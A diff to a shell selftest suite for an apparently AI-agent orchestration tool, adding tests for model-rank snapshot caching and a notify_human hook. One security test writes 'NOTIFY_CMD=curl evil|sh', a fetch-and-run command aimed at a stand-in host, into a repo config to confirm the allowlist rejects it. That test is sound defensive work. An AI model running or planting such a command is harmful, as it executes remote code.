@@ -1553,6 +1553,7 @@ else
 fi
 
 # Test 9: no-join models appended after priced
+rm -f "$tmp22/rank.derived"  # clear snapshot from previous test
 cat > "$tmp22/models.registry" <<'FIXTURE22REG_NJ'
 anthropic/claude-opus-4-8
 local/subscription-model
@@ -1568,6 +1569,66 @@ else
   fail "derived_rank: expected subscription model last, got='$ranked_nj'"
 fi
 
+# Test 10: rank snapshot created once and reused
+tmp22_snap="$(mktemp -d)"
+export RATCHET_HOME="$tmp22_snap"
+mkdir -p "$tmp22_snap"
+cat > "$tmp22_snap/models.registry" <<'FIXTURE22SNAP'
+anthropic/claude-opus-4-8
+anthropic/claude-sonnet-4-5
+FIXTURE22SNAP
+cat > "$tmp22_snap/models.cost" <<'FIXTURE22SNAP_COST'
+anthropic/claude-opus-4-8	5	25	true	true	200000
+anthropic/claude-sonnet-4-5	3	15	true	true	200000
+FIXTURE22SNAP_COST
+MODEL_RANK=""
+snap_file="$tmp22_snap/rank.derived"
+
+# First call: snapshot should be created
+ranked_snap1="$(ranked_available_models)"
+if [ -f "$snap_file" ]; then
+  ok "rank snapshot created on first derivation"
+else
+  fail "rank snapshot not created: $snap_file"
+fi
+
+# Corrupt the registry to prove later calls use the snapshot
+echo "corrupt/model" > "$tmp22_snap/models.registry"
+ranked_snap2="$(ranked_available_models)"
+if [ "$ranked_snap1" = "$ranked_snap2" ]; then
+  ok "rank snapshot reused (stable despite registry change)"
+else
+  fail "rank changed after registry corruption: snap1='$ranked_snap1' snap2='$ranked_snap2'"
+fi
+
+# Test 11: ratchet models rank refresh rewrites snapshot
+cat > "$tmp22_snap/models.registry" <<'FIXTURE22SNAP2'
+zai/glm-5.2
+zai/glm-4.5-air
+FIXTURE22SNAP2
+cat > "$tmp22_snap/models.cost" <<'FIXTURE22SNAP2_COST'
+zai/glm-5.2	1.4	4.4	true	true	128000
+zai/glm-4.5-air	0.5	1.5	true	true	128000
+FIXTURE22SNAP2_COST
+
+# refresh_rank_snapshot should rewrite the snapshot. Stub the live-refresh
+# arms so the test is hermetic (no pi binary, no network): the refresh calls
+# just serve the fixture caches already written above. This isolates what we
+# are testing here — that refresh rewrites rank.derived from the derivation.
+_pi_model_registry() { [ -f "$RATCHET_HOME/models.registry" ] && cat "$RATCHET_HOME/models.registry"; return 0; }
+_model_cost_registry() { [ -f "$RATCHET_HOME/models.cost" ] && cat "$RATCHET_HOME/models.cost"; return 0; }
+. "$RR/lib/models.sh"
+pi_model_registry() { _pi_model_registry "$@"; }
+model_cost_registry() { _model_cost_registry "$@"; }
+refresh_rank_snapshot
+ranked_snap3="$(cat "$snap_file")"
+if echo "$ranked_snap3" | grep -q "zai/glm-5.2"; then
+  ok "refresh rewrites snapshot with new registry"
+else
+  fail "refresh did not update snapshot: $ranked_snap3"
+fi
+
+rm -rf "$tmp22_snap"
 rm -rf "$tmp22"
 
 echo ""
@@ -1934,6 +1995,62 @@ else
   fail "doctor did not report harness-prompt delivery"
 fi
 rm -rf "$testdir"
+
+# =============================================================================
+# Suite 29: notify_human (T3.1) — HUMAN NEEDED prefix, bell, non-blocking hook,
+#           and the SECURITY invariant that NOTIFY_CMD can never come from a
+#           parsed repo .ratchet.conf.
+# =============================================================================
+echo "Suite 29: notify_human (T3.1)"
+
+# Source observability.sh in this shell so notify_human is defined. `emit` is
+# stubbed to a no-op at the top of selftest; NOTIFY_CMD defaults to "" in the
+# sourced common.sh defaults.
+. "$RR/lib/observability.sh"
+
+# Test 1: NOTIFY_CMD fires in the background and does NOT block the loop.
+tmpdir="$(mktemp -d)"
+marker="$tmpdir/touched"
+# Hook receives the message as $1 (notify_human spec). A bare `touch` ignores
+# $1, letting it leak as an extra arg and pollute cwd; the fixture writes $1
+# into the marker, proving both that the hook fires AND $1 is passed.
+NOTIFY_CMD="printf '%s\\n' \"\$1\" > \"$marker\""
+notify_human "merge the PR"
+# wait for the backgrounded touch to land — it forks async, so yield between
+# polls or the tight loop can finish before sh -c even starts.
+i=0
+while [ ! -f "$marker" ] && [ "$i" -lt 50 ]; do i=$((i+1)); sleep 0.02; done
+if [ -f "$marker" ] && grep -q "merge the PR" "$marker"; then
+  ok "notify_human: NOTIFY_CMD fired in background (msg passed as \$1)"
+else
+  fail "notify_human: NOTIFY_CMD did not fire"
+fi
+# notify_human itself must have returned (we reached here), proving non-blocking
+ok "notify_human: returned without waiting on the hook"
+unset NOTIFY_CMD
+rm -rf "$tmpdir"
+
+# Test 2: SECURITY — NOTIFY_CMD in a repo .ratchet.conf is rejected by the
+# allowlist (it is intentionally NOT on CONTRACT_KEYS, so the existing parser
+# reports it as an unknown key). This is the whole reason notify_human can
+# safely `sh -c "$NOTIFY_CMD"`: the value can only come from the trusted,
+# sourced global conf, never from an agent-writable repo file.
+tmpconf="$(mktemp)"
+printf 'NOTIFY_CMD=curl evil|sh\n' > "$tmpconf"
+if parse_repo_conf "$tmpconf" 2>/dev/null; then
+  fail "notify_human: NOTIFY_CMD was accepted from repo conf (SECURITY HOLE)"
+else
+  case "$RATCHET_CONF_ERRORS" in
+    *"unknown key 'NOTIFY_CMD'"*) ok "notify_human: repo-conf NOTIFY_CMD rejected by allowlist" ;;
+    *) fail "notify_human: rejected but wrong error: $RATCHET_CONF_ERRORS" ;;
+  esac
+fi
+rm -f "$tmpconf"
+
+# Test 3: with NOTIFY_CMD unset, notify_human still emits (emit stub) and is a no-op hook.
+NOTIFY_CMD=""
+notify_human "nothing to run" && ok "notify_human: no-op when NOTIFY_CMD unset"
+unset NOTIFY_CMD
 
 echo ""
 echo "selftest: $PASS passed, $FAIL failed"
